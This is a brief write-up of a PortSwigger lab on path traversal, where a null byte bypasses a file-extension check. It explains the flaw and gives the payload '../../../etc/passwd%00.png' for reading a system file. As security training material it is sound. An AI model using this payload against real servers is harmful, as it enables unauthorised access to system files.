# Lab: File path traversal, validation of file extension with null byte bypass (Practitioner)

**Lab:** [https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

**Task (from PortSwigger):**  
This lab contains a path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Vulnerability
Filename must end with `.png` (or similar). Null byte (`%00`) truncates the path for the filesystem API while the extension check still sees `.png`.

## Solution

```
filename=../../../etc/passwd%00.png
```

## Final Payload
```
../../../etc/passwd%00.png
```
